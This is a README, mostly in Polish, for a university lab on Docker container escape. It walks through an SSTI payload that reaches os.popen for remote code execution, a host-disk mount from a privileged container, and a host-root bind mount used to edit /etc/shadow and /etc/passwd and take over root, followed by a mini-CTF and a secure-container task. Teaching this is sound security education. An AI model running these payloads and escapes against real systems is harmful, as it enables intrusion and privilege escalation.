# Docker Escape
***This project shows vulnerability how to escape from Docker container in which web application is running.*** <br />
<br />
## *About*
This project was made for academic purposes during one of our courses at the AGH University of Krakow. <br />
We present security issues in Docker. We show vulnerabilities of this software and best practices related to them. Below we also include case-studies showing how to get into the server from the user level of a web application, how to escape from this container and the possibilities that open up to us after such an escape.<br />
<br />
  
## *Authors:*
- [Hubert Mąka](https://github.com/norka02)
- [Karol Makara](https://github.com/KarolMakara) 
- [Jakub Kowal](https://github.com/jd-kowal)

<br />

*** 
# Tasks
***
<br />

## *Task 0 - Przygotowanie środowiska*
Aby rozpocząć wykonywanie zadań sklonujcie repozytorium za pomocą ``git clone`` lub pobierzcie paczkę zip. Będziemy używać Dockera (kontener w kontenerze  z uruchomionym serwerem ubuntu). Całość została skonfigurowana w Dockerfile.

Jeżeli już posiadasz repozytorium na dysku przejdź do katalogu, w którym znajduje się plik z konfiguracją. Następnie wykonaj poniższe komendy: <br />

1. Build - zbuduj kontener (może zająć chwilę w zależności od szybkości łącza):
	```bash: 
	docker build -t ubuntu-dind .
	```
2. Run - uruchom kontener w tle:
	```bash: 
	docker run -d -p 5000:5000 --privileged --hostname ubuntu-dind --name ubuntu-dind ubuntu-dind
	```
3. Enter - wejdź do kontenera:
	```bash: 
	docker exec -itu adam ubuntu-dind bash
	```

> ***TIP** - w przypadku problemów -> zrestartuj kontener*

<br />

## *Task 1 - Dostęp do serwera z perspektywy użytkownika aplikacji webowej*
W kontenerze uruchomiona jest aplikacja webowa. Znając jej podatność omówioną podczas prezentacji spróbuj, za pomocą preparacji url-a, dokonać araku typu RCE, czyli z widoku interfejsu użytkownika wykonać kod po stronie serwera  (np. podawany podczas prezentacji przykład wyrażenia 7*7). 
<br />
> Jeżeli w wyniku wcześniejszego przykładu otrzymasz wynik 49
> to możemy przejść dalej.

 <br />
 
Teraz przyjrzyj się poniższemu wyrażeniu napisanym w języku Python. Jednak najpierw użyj w konsoli programu ``hack.py``, który jest dołączony do paczki z repozytorium i liczbę, którą znalazłeś wpisz zamiast ``<Liczba_Którą_Znalazłeś>``. 

> Jeżeli cię to ciekawi to poniższy kod w sprytny sposób przedostaje się
> z obiektu napisu przez moduł ``warnings`` i klasę ``WarningMessage``
> do modułu os, który posiada metody pozwalające na uruchamianie komend systemowych. <br />
> 
<br />

```
"baiim".__class__.__base__.__subclasses__()[<Liczba_Którą_Znalazłeś>].__init__.__globals__['sys'].modules['os'].popen(<Twoja_Komenda>).read()
```
<br />
Spróbuj wyświetlić strukturę plików w katalogu aplikacji na serwerze.

**Odpowiedź** - wyślij zrzut ekranu, który pokaże wylistowane w aplikacji wszystkie pliki i katalogi z  katalogu aplikacji na serwerze razem z użytą komendą.

<br />

## *Task 2 - Docker Escape & Privilege Escalation*


> **TIP** - proponujemy przejście z wykonywaniem zadań do terminala. Otwórz go w katalogu projektu.<br />

Ucieczkę z kontenera umożliwia nam złe skonfigurowanie kontenera przez osobę, która go tworzyła. Wciel się w taką osobę: <br />

1. Spróbuj zmienić użytkownika na root-a (nie powinieneś mieć takiej możliwości - powinieneś być na koncie użytkownika ``adam``) {**PE**}: 
	```bash
	su root
	```
2. Sprawdź listę dostępnych obrazów:
	```
	docker images
	```
3. Pobierz obraz Ubuntu Docker  ze zdalnego repozytorium:
	```
	docker pull ubuntu:18.04
	```

    Przykładowe pobranie obrazu:
    ![image](https://github.com/norka02/Docker-Escape/assets/121463460/e5f1fbfc-c4f9-4543-a6b0-f802d55b7039) 


4. Po pobraniu sprawdź czy obraz pobrał się poprawnie:
	```
	docker images
	```
5. Poniżej zostały przedstawione dwie przykładowe możliwości stworzenia kontenera z potencjalną podatnością: <br />

	1.  
		```
		docker run --rm -it --name kontener-adama --hostname ubuntu-by-adam --privileged ubuntu:18.04 bash
		```
	2. 
		```
		docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
		```
---

> ***Pierwsza opcja pozwoli nam stworzyć kontener z flagą ``--priviliged``, dzięki której będzie możliwe wyjście do systemu hosta poprzez zmontowanie partycji . W zależności od solidności zabezpieczeń serwera będzie można edytować pliki na maszynie hosta lub tylko je czytać.***


> **Druga opcja daje nam z reguły dużo większe możliwości jako osobie,
> która uruchamia kontener, ale także dużo większe możliwości dla
> potencjalnego atakującego. W skrócie montuje ona volumen z katalogu
> ``/`` hosta do katalogu ``/host`` w kontenerze dzięki czemu możemy
> przykładowo przesyłać pliki między hostem a kontenerem.**

---

6. Zacznijmy od pierwszego scenariusza. 
	Będąc na użytkowniku **adam** uruchom kontener {**DE**}. <br />
	Teraz jesteś wewnątrz swojego kontenera, który przed chwilą stworzyłeś. Możesz to 	sprawdzić za pomocą komend ``whoami`` oraz ``hostname``.
	<br />
Przykładowy ScreenShot znajduje się poniżej:
![image2](https://github.com/norka02/Docker-Escape/assets/94318576/7a2266e8-ce4f-44dd-9a3d-e93341a36755) <br />

	***Jak możesz zauważyć tworząc własny kontener masz w nim uprawnienia root-a. <br />***
	<br />


7. Następnie stwórz w utworzonym kontenerze katalog: <br />
	```bash
	mkdir -p /mnt/share
	```
8. Oraz podmontuj odpowiednią partycję dysku do tego katalogu np. /dev/sdc: <br />
	```bash
	mount /dev/sdc /mnt/share
	```
---
Domyślnie polecenie mount nadaje ci prawa do zapisu i odczytu, ale jeśli wystąpiłby przykładowo taki komunikat zmień partycję dysku(chociaż i tak już udało ci się zrobić więcej niż pozwalały na to uprawnienia użytkownika adam):
![image3](https://github.com/norka02/Docker-Escape/assets/94318576/d1cd3e07-3672-4086-bb40-2b86b14bceb5) <br />
 Listę partycji możesz uzyskać za pomocą polecenia: <br />
```bash
lsblk
```
---
9. Dzięki podmontowaniu partycji jesteśmy w stanie uzyskać dostep do struktury katalogów hosta. Sprawdź czy masz dostęp do struktury katalogów hosta:
	```bash
	 ls -l /mnt/share 
	```
	Poszperaj trochę po systemie. Może znajdziesz coś ciekawego ;). 
	PS: Zobacz jak niewiele trzeba do wycieku danych. <br />

10. Wyjdź z kontenera za pomocą ``exit``. <br />


11. Teraz przejdźmy do scenariusza drugiego. Uruchom kontener za pomocą wcześniej podanej komendy. Następnie wylistuj strukturę katalogów w której obecnie się znajdujesz. 
12. Spróbuj przedostać się do zewnętrznego systemu plików, odnajdź pliki ``/etc/shadow`` oraz ``/etc/passwd`` i usuń w nich elementy odpowiadające za uwierzytelnienie użytkownika root. 
---
  *Jeżeli nie masz zainstalowengo żadnego edytora tekstowego wykonaj poniższe komendy:*
  ```bash
  apt update
  ```
  
  *Instalacja w kontenerze wybranego przez siebie edytora tekstowego (np. vim, nano):*
  ```bash
  apt install vim
  ```
---
13. Za pomocą edytora tekstowego otwórz plik ``/etc/shadow`` oraz ``/etc/passwd``. 

14. Trzeba usunąć część wskazującą na obecność hasła root-a w pliku passwd{**PE**}. Zrób tak samo z plikiem shadow. <br />
	
	![image5](https://github.com/norka02/Docker-Escape/assets/94318576/8bf49b45-925b-4c12-b7a5-9a6a5cbf5b4b)
		![image4](https://github.com/norka02/Docker-Escape/assets/94318576/f38a79ad-7e7a-4e0b-a404-cfce4b5aaea8)

15. Wyjdź z kontenera za pomocą ``exit``. <br />

16. Zmień użytkownika na root-a {**PE**}:
	```bash
	su root
	```
Brawo właśnie przejąłeś konto roota! <br />

**Odpowiedź** - wyślij zrzut ekrany potwierdzający twoje uprawnienia root-a. 
<br />

## *Task 3 - Mini-CTF*
Mając uprawnienia root-a możesz poruszać się bezproblemowo po systemie. Znajdź **tajny** katalog, który nie powinien znajdować się w systemie/wyróżnia się spośród pozostałych. W nim znajduje się plik z flagą. Zmodyfikuj znaleziony plik dodając swoje imię i nazwisko.

> Flaga znajduje się w pliku tekstowym i jest oznaczona w następujący
> sposób: ``` CTF{<flaga>} ```

**Odpowiedź** - wyślij widoczną zmodyfikowaną flagę wraz z dopisanym unikalnym tekstem wymienionym wyżej oraz ścieżkę do katalogu, w którym znajduje się znaleziona flaga.  <br />

## *Task 4 - Tworzenie Bezpiecznego Kontenera*
Posiadając całą wiedzę zdobytą podczas prezentacji oraz poprzednich zadań zastanów się w jaki sposób możesz zabezpieczyć kontener przed różnymi wektorami ataków. Stwórz kontener, który spełnia wszystkie best-practice dot. bezpiecznego tworzenia kontenera Dockera.  <br />

**Odpowiedź** - wyślij widoczną komendę, która tworzy **Bezpieczny Kontener**. <br />
